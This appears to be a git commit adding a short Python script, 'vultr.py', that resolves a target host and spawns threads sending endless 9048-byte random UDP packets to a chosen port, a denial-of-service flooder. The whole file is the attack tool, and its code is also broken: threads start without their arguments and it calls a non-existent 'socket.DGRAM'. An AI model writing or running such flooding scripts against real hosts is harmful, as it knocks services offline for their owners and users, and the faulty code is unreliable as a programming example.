f7d62c66a91f06c5047fab8b5d82f5856b9d2634
PhynX <48216256+PhynX404@users.noreply.github.com>
2021-10-10 23:48:16 +0700

    Create vultr.py

---
+++ vultr.py
@@ -0,0 +1,34 @@
+import os
+import sys
+import time
+import socket
+import random
+import threading
+
+def main():
+  tg = str(sys.argv[1])
+  tg = socket.gethostbyname(tg)
+  po = int(sys.argv[2])
+  th = int(sys.argv[3])
+  for x in range(th):
+    th = threading.Thread(target=etek)
+    th.start()
+
+def etek(ip, port):
+  pkt = random._urandom(9048)
+  s = socket.socket(socket.AF_INET, socket.DGRAM)
+  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+  while True:
+    try:
+      s.connect((ip, port))
+      s.send(pkt)
+      print("Sending 9048 Packets to => "+str(ip)+":"+str(port))
+    except socket.error:
+      s.close()
+    except KeyboardInterrupt:
+      break
+    except:
+      pass
+
+if __name__ == "__main__":
+  main()
